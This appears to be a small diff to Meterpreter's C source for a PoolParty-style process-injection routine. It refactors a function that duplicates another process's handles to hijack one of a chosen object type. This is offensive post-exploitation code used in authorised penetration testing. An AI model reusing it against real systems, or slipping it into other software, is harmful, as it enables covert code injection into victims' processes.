@@ -182,14 +182,14 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
 	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
-		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
+		if (met_api->win_api.kernel32.DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
 			pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
 			if (dwInformationSizeIn > dwInformationSizeOut) {
 				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
 					break;
 				}
 			}
-			CloseHandle(hHijackHandle);
+			met_api->win_api.kernel32.CloseHandle(hHijackHandle);
 		}
 		hHijackHandle = INVALID_HANDLE_VALUE;
 	}
